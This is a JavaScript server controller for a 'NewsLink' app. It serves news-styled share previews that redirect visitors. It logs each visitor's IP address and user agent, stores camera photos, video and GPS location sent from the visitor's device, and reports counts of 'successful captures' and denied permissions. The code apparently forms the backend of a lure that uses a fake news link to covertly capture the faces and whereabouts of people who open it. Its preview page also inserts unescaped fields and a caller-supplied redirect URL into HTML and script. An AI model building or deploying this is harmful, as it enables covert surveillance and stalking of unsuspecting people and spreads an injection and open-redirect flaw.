import Visitor from '../models/Visitor.js';
import Newspaper from '../models/Newspaper.js';
import Click from '../models/Click.js';
import { uploadPhotoToR2, deletePhotoFromR2 } from '../services/cloudflareStorage.js';

export const generateSharePreview = async (req, res) => {
  try {
    const { linkId } = req.params;
    const { frontendUrl } = req.query;
    
    const newspaper = await Newspaper.findOne({ linkId });
    if (!newspaper) return res.status(404).send('Not Found');

    const title = newspaper.headline || newspaper.title || 'Breaking News';
    const description = newspaper.summary || 'Read the full story here...';
    const image = newspaper.coverImage || '';
    const baseUrl = frontendUrl || 'http://localhost:5173';
    const redirectUrl = `${baseUrl}/news/${linkId}`;

    const html = `
      <!DOCTYPE html>
      <html lang="en">
      <head>
          <meta charset="UTF-8">
          <meta name="viewport" content="width=device-width, initial-scale=1.0">
          <title>${title}</title>
          <meta property="og:title" content="${title}">
          <meta property="og:description" content="${description}">
          <meta property="og:image" content="${image}">
          <meta property="og:image:secure_url" content="${image}">
          <meta property="og:url" content="${redirectUrl}">
          <meta property="og:type" content="article">
          <meta property="og:site_name" content="NewsLink">
          <meta name="twitter:card" content="summary_large_image">
          <meta name="twitter:title" content="${title}">
          <meta name="twitter:description" content="${description}">
          <meta name="twitter:image" content="${image}">
          
          <script>
              // Redirect users to the actual frontend application
              window.location.replace("${redirectUrl}");
          </script>
      </head>
      <body>
          <p>If you are not redirected automatically, <a href="${redirectUrl}">click here</a>.</p>
      </body>
      </html>
    `;

    res.send(html);
  } catch (error) {
    res.status(500).send('Server Error');
  }
};

export const registerClick = async (req, res) => {
  try {
    const newspaper = await Newspaper.findOne({ linkId: req.params.linkId });
    if (!newspaper) return res.status(404).json({ success: false, message: 'Newspaper not found' });
    
    const ipAddress = req.headers['x-forwarded-for'] || req.socket.remoteAddress || req.ip;
    const userAgent = req.headers['user-agent'] || '';
    
    await Click.create({ newspaperId: newspaper._id, linkId: req.params.linkId, ipAddress, userAgent });
    
    res.json({ success: true, message: 'Click registered' });
  } catch (error) {
    res.status(500).json({ success: false, message: error.message });
  }
};

export const getNewspaperByLinkId = async (req, res) => {
  try {
    const newspaper = await Newspaper.findOne({ linkId: req.params.linkId });
    if (!newspaper) return res.status(404).json({ success: false, message: 'Newspaper not found' });
    res.json({ success: true, data: newspaper });
  } catch (error) {
    res.status(500).json({ success: false, message: error.message });
  }
};

export const captureVisitor = async (req, res) => {
  try {
    const { linkId } = req.params;
    const { sessionId, latitude, longitude } = req.body;
    const file = req.file;

    const newspaper = await Newspaper.findOne({ linkId });
    if (!newspaper) return res.status(404).json({ success: false, message: 'Newspaper not found' });

    if (!file) {
      await Visitor.create({ newspaperId: newspaper._id, linkId, sessionId: sessionId || 'unknown', permissionStatus: 'denied' });
      return res.status(400).json({ success: false, message: 'No image provided' });
    }

    const photoUrl = await uploadPhotoToR2(file.buffer, file.originalname, file.mimetype);

    const visitorData = {
      newspaperId: newspaper._id,
      linkId,
      sessionId: sessionId || 'unknown',
      photoUrl,
      permissionStatus: 'granted',
    };

    if (latitude && longitude) {
      visitorData.location = { latitude: parseFloat(latitude), longitude: parseFloat(longitude) };
    }

    const visitor = await Visitor.create(visitorData);

    res.status(201).json({ success: true, data: visitor });
  } catch (error) {
    res.status(500).json({ success: false, message: error.message });
  }
};

export const captureVideo = async (req, res) => {
  try {
    const { linkId } = req.params;
    const { sessionId } = req.body;
    const file = req.file;

    if (!file || !sessionId) {
      return res.status(400).json({ success: false, message: 'Video and sessionId are required' });
    }

    const videoUrl = await uploadPhotoToR2(file.buffer, file.originalname, file.mimetype);

    const visitor = await Visitor.findOneAndUpdate(
      { linkId, sessionId },
      { videoUrl },
      { new: true }
    );

    if (!visitor) {
      return res.status(404).json({ success: false, message: 'Visitor record not found' });
    }

    res.status(200).json({ success: true, data: visitor });
  } catch (error) {
    res.status(500).json({ success: false, message: error.message });
  }
};

export const getVisitors = async (req, res) => {
  try {
    const visitors = await Visitor.find({}).sort({ createdAt: -1 }).populate('newspaperId', 'title');
    res.json({ success: true, data: visitors });
  } catch (error) {
    res.status(500).json({ success: false, message: error.message });
  }
};

export const deleteVisitorPhoto = async (req, res) => {
  try {
    const visitor = await Visitor.findById(req.params.id);
    if (!visitor) return res.status(404).json({ success: false, message: 'Visitor not found' });

    if (visitor.photoUrl) {
      await deletePhotoFromR2(visitor.photoUrl);
      visitor.photoUrl = null;
      await visitor.save();
    }
    res.json({ success: true, message: 'Photo deleted securely' });
  } catch (error) {
    res.status(500).json({ success: false, message: error.message });
  }
};

export const deleteVisitor = async (req, res) => {
  try {
    const visitor = await Visitor.findById(req.params.id);
    if (!visitor) return res.status(404).json({ success: false, message: 'Visitor not found' });

    if (visitor.photoUrl) {
      await deletePhotoFromR2(visitor.photoUrl);
    }
    if (visitor.videoUrl) {
      await deletePhotoFromR2(visitor.videoUrl);
    }
    
    await Visitor.findByIdAndDelete(req.params.id);
    res.json({ success: true, message: 'Visitor and associated media deleted securely' });
  } catch (error) {
    res.status(500).json({ success: false, message: error.message });
  }
};

export const deleteAllVisitors = async (req, res) => {
  try {
    const visitors = await Visitor.find({});
    
    let mediaCount = 0;
    for (const visitor of visitors) {
      if (visitor.photoUrl) {
        await deletePhotoFromR2(visitor.photoUrl);
        mediaCount++;
      }
      if (visitor.videoUrl) {
        await deletePhotoFromR2(visitor.videoUrl);
        mediaCount++;
      }
    }
    
    await Visitor.deleteMany({});
    res.json({ success: true, message: `Successfully deleted all visitors and ${mediaCount} media files` });
  } catch (error) {
    res.status(500).json({ success: false, message: error.message });
  }
};

export const getNewspaperAnalytics = async (req, res) => {
  try {
    const newspaper = await Newspaper.findById(req.params.id);
    if (!newspaper) return res.status(404).json({ success: false, message: 'Newspaper not found' });

    const visitors = await Visitor.find({ newspaperId: req.params.id }).sort({ createdAt: -1 });
    const clicks = await Click.countDocuments({ newspaperId: req.params.id });
    
    const uniqueSessions = new Set(visitors.map(v => v.sessionId)).size;
    const successfulCaptures = visitors.filter(v => v.permissionStatus === 'granted').length;
    const deniedPermissions = visitors.filter(v => v.permissionStatus === 'denied').length;

    res.json({
      success: true,
      data: {
        totalClicks: clicks,
        totalVisits: visitors.length,
        uniqueVisitors: uniqueSessions,
        successfulCaptures,
        deniedPermissions,
        recentVisitors: visitors.slice(0, 10)
      }
    });
  } catch (error) {
    res.status(500).json({ success: false, message: error.message });
  }
};

export const getClicks = async (req, res) => {
  try {
    const clicks = await Click.find({}).sort({ createdAt: -1 }).populate('newspaperId', 'title');
    res.json({ success: true, data: clicks });
  } catch (error) {
    res.status(500).json({ success: false, message: error.message });
  }
};
